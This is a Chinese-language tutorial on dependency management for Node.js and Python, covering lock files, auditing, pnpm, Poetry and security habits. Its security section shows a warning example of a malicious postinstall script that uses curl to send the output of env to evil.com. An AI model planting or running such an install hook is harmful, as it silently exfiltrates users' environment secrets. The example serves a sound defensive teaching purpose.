# 依赖管理最佳实践

## 引言

通过前面的文档，你已经了解：
- 为什么 `node_modules` 有这么多文件（依赖爆炸）
- `node_modules` 和 `.venv` 的异同
- left-pad 事件的教训

现在让我们讨论：**如何合理管理依赖，避免依赖地狱？**

---

## 核心原则

### 1. 最小化原则

**只安装真正需要的依赖**

#### ❌ 不好的做法

```bash
# 为了一个简单功能安装整个库
npm install lodash  # 只用了 _.debounce

# 安装了但从不使用
npm install moment  # 项目里没有用到
```

#### ✅ 好的做法

```bash
# 只安装需要的子包
npm install lodash.debounce

# 或使用现代 JavaScript 原生 API
# 不需要安装任何包
```

### 2. 谨慎选择原则

**评估依赖的质量**

#### 评估清单

在安装包之前，问自己：

```
□ 这个功能能自己实现吗？（<20 行代码 → 自己写）
□ 这个包有多少周下载量？（<1000 → 谨慎）
□ 最后一次更新是什么时候？（>2 年 → 可能已废弃）
□ 有多少个 issue 未解决？（>100 → 可能维护不佳）
□ 这个包有多少依赖？（>50 → 可能带来依赖爆炸）
□ 有没有更流行的替代品？
□ 有没有安全漏洞？（npm audit）
□ 许可证是什么？（MIT/Apache → 好，自定义 → 需审查）
```

#### 查看包信息的工具

```bash
# 查看包的详细信息
npm info <package-name>

# 查看包的依赖
npm view <package-name> dependencies

# 查看包的周下载量
npm info <package-name> | grep downloads

# 查看包的主页和仓库
npm repo <package-name>
npm home <package-name>

# 在线工具
# https://bundlephobia.com/ - 查看包的大小
# https://snyk.io/advisor/ - 包健康度评分
# https://socket.dev/ - 安全性分析
```

### 3. 优先原生 API

**现代 JavaScript/Python 已经很强大了**

#### JavaScript 示例

```javascript
// ❌ 不需要的依赖
import _ from 'lodash'
import moment from 'moment'
import axios from 'axios'  // 有时候不需要

// ✅ 使用原生 API
// 数组操作
const numbers = [1, 2, 3, 4, 5]
numbers.filter(n => n > 2)   // 不需要 _.filter
numbers.map(n => n * 2)      // 不需要 _.map
numbers.reduce((a, b) => a + b, 0)  // 不需要 _.sum

// 日期处理（简单场景）
const now = new Date()
now.toISOString()           // 不需要 moment
now.getTime()               // 不需要 moment

// HTTP 请求（现代浏览器）
fetch('https://api.example.com/data')  // 不需要 axios
  .then(res => res.json())

// 字符串处理
'123'.padStart(5, '0')      // 不需要 left-pad
'abc'.repeat(3)             // 不需要 repeat-string
'hello world'.includes('world')  // 不需要字符串工具

// 类型检查
Array.isArray(arr)          // 不需要 is-array
Number.isInteger(n)         // 不需要 is-integer
```

#### Python 示例

```python
# ✅ 优先使用标准库
import json         # 不需要 simplejson（除非有特殊需求）
import re           # 不需要额外的正则库
import datetime     # 不需要 arrow（除非需要高级功能）
import urllib       # 简单请求不需要 requests
import pathlib      # 不需要额外的路径库

# 只在标准库不够用时才安装第三方包
import requests     # 复杂 HTTP 请求
import pandas       # 数据分析
import numpy        # 科学计算
```

### 4. 定期审计原则

**定期检查和更新依赖**

```bash
# Node.js
npm audit           # 检查安全漏洞
npm outdated        # 检查过时的包
npm update          # 更新包（遵循 package.json 的版本范围）

# Python
pip list --outdated # 检查过时的包
pip install --upgrade <package>  # 升级包
safety check        # 检查安全漏洞（需安装 safety）
```

---

## Node.js 最佳实践

### 1. 使用 lock 文件

**package-lock.json 的重要性**

```bash
# ✅ 好的做法
git add package.json package-lock.json
git commit -m "Add dependencies"

# ❌ 不好的做法
echo "package-lock.json" >> .gitignore  # 千万不要这样！
```

**为什么？**

```
开发者 A（2023-06-01）：
package.json: "vue": "^3.3.0"
实际安装：vue@3.3.4

开发者 B（2023-08-01）：
package.json: "vue": "^3.3.0"  # 相同
但安装：vue@3.3.5  # Vue 发布了新版本

结果：A 能运行，B 可能报错
```

**有了 package-lock.json**：

```
开发者 A 和 B 都安装：vue@3.3.4
保证一致性！
```

### 2. 使用 npm ci 而不是 npm install

**CI/CD 环境推荐**

```bash
# ❌ CI 中不推荐
npm install

# ✅ CI 中推荐
npm ci
```

**区别**：

| 特性 | npm install | npm ci |
|------|-------------|--------|
| **速度** | 慢 | 快（可能快 2-3 倍） |
| **行为** | 更新 package-lock.json | 严格按照 package-lock.json |
| **node_modules** | 增量安装 | 删除后重新安装 |
| **适用场景** | 本地开发 | CI/CD 环境 |

### 3. 区分 dependencies 和 devDependencies

**正确分类依赖**

```json
{
  "dependencies": {
    // 生产环境需要的包
    "vue": "^3.5.18",
    "axios": "^1.12.2",
    "pinia": "^3.0.3"
  },
  "devDependencies": {
    // 仅开发时需要的包
    "vite": "^7.0.6",
    "eslint": "^9.31.0",
    "prettier": "^3.6.2",
    "typescript": "^5.8.0",
    "@types/node": "^22.16.5"
  }
}
```

**安装命令**：

```bash
# 安装到 dependencies
npm install --save <package>
npm i -S <package>

# 安装到 devDependencies
npm install --save-dev <package>
npm i -D <package>

# 生产环境只安装 dependencies
npm install --production
```

### 4. 使用 .npmrc 配置

**项目根目录创建 .npmrc**

```bash
# .npmrc

# 使用国内镜像加速下载（中国大陆）
registry=https://registry.npmmirror.com

# 保存时自动添加精确版本（而不是 ^）
save-exact=true

# 不安装可选依赖（减少依赖数量）
optional=false

# 引擎严格模式（确保 Node.js 版本匹配）
engine-strict=true
```

### 5. 设置 engines 字段

**在 package.json 中指定 Node.js 版本**

```json
{
  "engines": {
    "node": ">=22.0.0",
    "npm": ">=10.0.0"
  }
}
```

**配合 .nvmrc 使用**：

```bash
# .nvmrc
22.12.0
```

```bash
# 自动切换到项目指定的 Node.js 版本
nvm use
```

### 6. 审计依赖安全性

```bash
# 检查安全漏洞
npm audit

# 自动修复（只更新补丁版本）
npm audit fix

# 强制修复（可能包含破坏性更新）
npm audit fix --force

# 查看详细信息
npm audit --json
```

### 7. 定期清理无用依赖

```bash
# 安装 depcheck
npm install -g depcheck

# 检查无用依赖
depcheck

# 输出示例：
# Unused dependencies
# * moment
# * lodash
#
# Unused devDependencies
# * @types/react
```

### 8. 考虑使用 pnpm

**pnpm 的优势**

```bash
# 安装 pnpm
npm install -g pnpm

# 使用 pnpm
pnpm install

# 优势：
# 1. 磁盘占用减少 50%+（硬链接共享）
# 2. 安装速度更快
# 3. 严格依赖隔离（避免幽灵依赖）
```

**磁盘占用对比**：

```
同一台机器上 10 个项目：

npm：
project-1/node_modules: 450MB
project-2/node_modules: 480MB
...
总计：约 4.5GB

pnpm：
~/.pnpm-store: 600MB（全局缓存）
project-1/node_modules: 100MB（符号链接）
project-2/node_modules: 100MB（符号链接）
...
总计：约 1.6GB（节省 64%）
```

### 9. 版本号管理

**语义化版本号**

```
版本号：主版本号.次版本号.修订号
       1.2.3
       │ │ │
       │ │ └─ 修订号（Patch）：bug 修复
       │ └─── 次版本号（Minor）：新功能，向后兼容
       └───── 主版本号（Major）：破坏性更新
```

**版本范围符号**

```json
{
  "dependencies": {
    "vue": "3.5.18",      // 精确版本
    "axios": "^1.12.2",   // 允许 1.12.2 ~ 1.x.x
    "pinia": "~3.0.3",    // 允许 3.0.3 ~ 3.0.x
    "lodash": ">=4.17.0", // 大于等于 4.17.0
    "react": "*"          // 任意版本（不推荐！）
  }
}
```

**推荐做法**：

```json
{
  "dependencies": {
    // 生产环境：使用精确版本
    "vue": "3.5.18",
    "react": "18.2.0",

    // 或使用 ^ 但锁定主版本
    "axios": "^1.12.2"  // 允许 1.x.x，但不会升到 2.0.0
  }
}
```

---

## Python 最佳实践

### 1. 始终使用虚拟环境

```bash
# ✅ 好的做法
cd my-project
python -m venv .venv
source .venv/bin/activate
pip install flask

# ❌ 不好的做法
sudo pip install flask  # 污染全局环境！
```

### 2. 使用 requirements.txt

**基本 requirements.txt**

```
# requirements.txt

# 生产依赖
Flask==3.1.0
requests>=2.31.0
SQLAlchemy~=2.0.0

# 精确版本（推荐）
werkzeug==3.1.3
jinja2==3.1.4
```

**开发依赖分离**

```
# requirements.txt（生产依赖）
Flask==3.1.0
requests==2.31.0

# requirements-dev.txt（开发依赖）
-r requirements.txt  # 包含生产依赖
pytest==7.4.0
black==23.7.0
mypy==1.5.0
```

```bash
# 安装生产依赖
pip install -r requirements.txt

# 安装开发依赖
pip install -r requirements-dev.txt
```

### 3. 使用 pip freeze 谨慎

```bash
# ❌ 不好的做法
pip freeze > requirements.txt
# 问题：会包含所有传递依赖，文件很长

# ✅ 好的做法
# 手动维护 requirements.txt，只列出直接依赖
cat > requirements.txt << 'EOF'
Flask==3.1.0
requests==2.31.0
EOF

# 或使用 pipreqs（根据代码中的 import 生成）
pip install pipreqs
pipreqs . --force
```

### 4. 考虑使用 Poetry

**Poetry 的优势**

```bash
# 安装 Poetry
pip install poetry

# 初始化项目
poetry init

# 添加依赖
poetry add flask

# 安装依赖
poetry install

# 运行命令（自动激活虚拟环境）
poetry run python app.py
```

**pyproject.toml**（类似 package.json）

```toml
[tool.poetry]
name = "my-flask-app"
version = "1.0.0"
description = "My Flask application"

[tool.poetry.dependencies]
python = "^3.11"
flask = "^3.1.0"
requests = "^2.31.0"

[tool.poetry.dev-dependencies]
pytest = "^7.4.0"
black = "^23.7.0"
```

**poetry.lock**（类似 package-lock.json）

```bash
# 自动生成，确保可重复构建
poetry lock

# 提交到 Git
git add pyproject.toml poetry.lock
```

### 5. 使用 pip-audit 检查安全性

```bash
# 安装 pip-audit
pip install pip-audit

# 检查安全漏洞
pip-audit

# 输出示例：
# Found 2 known vulnerabilities in 1 package
# Name    Version ID                  Fix Versions
# ------- ------- ------------------- ------------
# flask   2.0.0   PYSEC-2023-221      2.2.5,2.3.2
```

### 6. .gitignore 配置

```bash
# .gitignore

# 虚拟环境
.venv/
venv/
env/

# Python 缓存
__pycache__/
*.py[cod]
*$py.class

# 测试和覆盖率
.pytest_cache/
.coverage
htmlcov/

# IDE
.vscode/
.idea/
*.swp
```

---

## 跨语言通用原则

### 1. 依赖文件必须提交

| 语言 | 配置文件 | lock 文件 | 是否提交 |
|------|----------|-----------|---------|
| Node.js | `package.json` | `package-lock.json` | ✅ 必须 |
| Python | `requirements.txt` | `requirements.txt`（带版本） | ✅ 必须 |
| Python | `pyproject.toml` | `poetry.lock` | ✅ 必须 |

### 2. 依赖目录不提交

| 语言 | 依赖目录 | 是否提交 |
|------|----------|---------|
| Node.js | `node_modules/` | ❌ 不提交 |
| Python | `.venv/`, `venv/` | ❌ 不提交 |

### 3. 文档化依赖选择理由

**在 README.md 中说明**

```markdown
# 项目名称

## 主要依赖

- **Vue 3**: 前端框架
- **Pinia**: 状态管理（比 Vuex 更简单）
- **Axios**: HTTP 客户端（比 fetch 更强大）
- **Ant Design Vue**: UI 组件库

## 为什么不用 X？

- **为什么不用 Moment.js**: 已停止维护，改用原生 Date API
- **为什么不用 Lodash**: 大部分功能已被 ES6+ 原生 API 替代
```

---

## 安全最佳实践

### 1. 双因素认证（2FA）

**npm 账号启用 2FA**

```bash
npm profile enable-2fa
```

### 2. 审查 package.json scripts

**小心恶意脚本**

```json
{
  "scripts": {
    // ⚠️ 审查这些脚本，确保没有恶意命令
    "postinstall": "node scripts/setup.js",
    "preinstall": "node scripts/check.js"
  }
}
```

**恶意示例**：

```json
{
  "scripts": {
    // ❌ 恶意：安装时上传你的环境变量到远程服务器
    "postinstall": "curl -X POST https://evil.com/steal -d \"$(env)\""
  }
}
```

### 3. 使用 .npmignore

**避免发布敏感文件**

```
# .npmignore

.env
.env.local
*.key
*.pem
secrets/
```

### 4. 检查包的 postinstall 脚本

```bash
# 查看包的 scripts
npm view <package-name> scripts

# 如果有可疑的 postinstall，不要安装！
```

---

## 监控和维护

### 1. 设置依赖机器人

**GitHub Dependabot**（自动检测依赖更新）

```yaml
# .github/dependabot.yml

version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
```

### 2. 定期审查

**每月/每季度任务清单**

```
□ 运行 npm audit / pip-audit
□ 运行 npm outdated / pip list --outdated
□ 检查无用依赖（depcheck）
□ 更新重要的安全补丁
□ 阅读重要依赖的更新日志
□ 测试更新后的依赖是否破坏现有功能
```

### 3. 订阅安全通告

- **npm**: https://github.com/advisories
- **PyPI**: https://pypi.org/security/
- **Snyk**: https://snyk.io/

---

## 工具推荐

### Node.js 工具

```bash
# 依赖分析
npm install -g depcheck      # 检查无用依赖
npm install -g npm-check     # 检查更新和问题
npm install -g cost-of-modules  # 查看依赖的磁盘占用

# 包大小分析
# https://bundlephobia.com/

# 安全分析
npm audit
# https://socket.dev/
# https://snyk.io/

# 替代包管理器
npm install -g pnpm   # 快速、节省空间
npm install -g yarn   # Facebook 开发
```

### Python 工具

```bash
# 依赖分析
pip install pipreqs        # 根据代码生成 requirements.txt
pip install pip-autoremove # 自动删除无用依赖

# 安全分析
pip install pip-audit      # 检查安全漏洞
pip install safety         # 另一个安全检查工具

# 包管理工具
pip install poetry         # 现代依赖管理
pip install pipenv         # 虚拟环境 + 依赖管理
```

---

## 实战案例

### 案例1：优化你的 Vue 博客项目

**当前状态**：
```bash
cd /home/seeback/learingProject/seeback/seebackのblog

# 当前依赖数量
ls node_modules | wc -l
# 800+

# 磁盘占用
du -sh node_modules
# 350-500MB
```

**优化步骤**：

```bash
# 1. 检查无用依赖
npx depcheck

# 2. 检查安全漏洞
npm audit

# 3. 查看过时的包
npm outdated

# 4. 考虑替换大型依赖
# 例如：Ant Design Vue 很大，如果只用了少数组件，
# 考虑改用更轻量的 UI 库或按需引入

# 5. 使用 pnpm 减少磁盘占用
npm install -g pnpm
pnpm install
# 可能减少 50% 磁盘占用

# 6. 配置 .npmrc
cat > .npmrc << 'EOF'
registry=https://registry.npmmirror.com
save-exact=true
EOF
```

### 案例2：创建 Flask 项目模板

```bash
# 1. 创建项目
mkdir my-flask-app
cd my-flask-app

# 2. 创建虚拟环境
python -m venv .venv
source .venv/bin/activate

# 3. 安装依赖
pip install flask requests

# 4. 创建 requirements.txt
cat > requirements.txt << 'EOF'
Flask==3.1.0
requests==2.31.0
EOF

# 5. 创建 requirements-dev.txt
cat > requirements-dev.txt << 'EOF'
-r requirements.txt
pytest==7.4.0
black==23.7.0
mypy==1.5.0
EOF

# 6. 创建 .gitignore
cat > .gitignore << 'EOF'
.venv/
__pycache__/
*.pyc
.env
EOF

# 7. 提交到 Git
git init
git add requirements.txt requirements-dev.txt .gitignore
git commit -m "Initial commit"
```

---

## 总结

### 核心原则

1. **最小化依赖**：只安装真正需要的包
2. **谨慎选择**：评估包的质量和维护状态
3. **优先原生**：现代语言特性已经很强大
4. **定期审计**：检查安全漏洞和过时依赖
5. **使用 lock 文件**：确保可重复构建
6. **正确分类**：区分生产依赖和开发依赖

### 记住的数字

| 场景 | 推荐做法 |
|------|---------|
| **代码 <20 行** | 自己实现 |
| **周下载量 <1000** | 谨慎使用 |
| **最后更新 >2 年** | 可能已废弃 |
| **依赖数量 >50** | 可能带来依赖爆炸 |

### 工具清单

**Node.js**：
- `npm audit` - 安全检查
- `npm outdated` - 更新检查
- `depcheck` - 无用依赖检查
- `pnpm` - 更好的包管理器

**Python**：
- `pip-audit` - 安全检查
- `pip list --outdated` - 更新检查
- `pipreqs` - 智能生成 requirements.txt
- `poetry` - 现代依赖管理

### 下一步行动

1. **审计你的项目**：
   ```bash
   # Vue 博客
   cd /home/seeback/learingProject/seeback/seebackのblog
   npm audit
   npx depcheck

   # Flask 项目（如果有）
   cd /home/seeback/PycharmProjects/python/pythonWeb
   source .venv/bin/activate
   pip-audit
   ```

2. **配置工具**：
   - 创建 `.npmrc`
   - 配置 Dependabot
   - 设置 npm 2FA

3. **建立习惯**：
   - 每月运行一次 `npm audit`
   - 每季度更新主要依赖
   - 新增依赖前评估必要性

---

## 推荐阅读

- [npm 官方最佳实践](https://docs.npmjs.com/cli/v9/using-npm/best-practices)
- [Python 打包指南](https://packaging.python.org/)
- [语义化版本规范](https://semver.org/lang/zh-CN/)
- [OWASP 依赖检查指南](https://owasp.org/www-community/Component_Analysis)
